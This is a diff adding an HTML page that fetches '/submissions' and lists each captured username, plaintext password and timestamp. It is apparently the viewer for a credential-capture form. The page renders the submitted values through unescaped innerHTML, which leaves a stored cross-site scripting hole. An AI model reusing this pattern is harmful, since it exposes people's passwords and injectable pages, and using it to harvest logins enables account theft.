@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Submissions</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+            font-size: 14px;
+        }
+        th, td {
+            padding: 10px;
+            border-bottom: 1px solid #ddd;
+            text-align: left;
+        }
+        th {
+            background: #f0f0f0;
+        }
+        .container {
+            max-width: 600px;
+            margin: auto;
+        }
+    </style>
+</head>
+<body>
+    <div class="card fade-in container">
+        <h1>Saved Submissions</h1>
+        <table id="table">
+            <thead>
+                <tr>
+                    <th>Username</th>
+                    <th>Password</th>
+                    <th>Timestamp</th>
+                </tr>
+            </thead>
+            <tbody id="tbody">
+                <tr><td colspan="3">Loading...</td></tr>
+            </tbody>
+        </table>
+    </div>
+
+    <script>
+        async function loadData() {
+            const res = await fetch('/submissions');
+            const data = await res.json();
+
+            const tbody = document.getElementById('tbody');
+            tbody.innerHTML = "";
+
+            if (data.length === 0) {
+                tbody.innerHTML = "<tr><td colspan='3'>No submissions yet.</td></tr>";
+                return;
+            }
+            data.forEach(entry => {
+                const row = document.createElement('tr');
+                row.innerHTML = `
+                    <td>${entry.username}</td>
+                    <td>${entry.password}</td>
+                    <td>${entry.timestamp}</td>
+                `;
+                tbody.appendChild(row);
+            });
+        }
+
+        loadData();
+    </script>
+</body>
+</html>
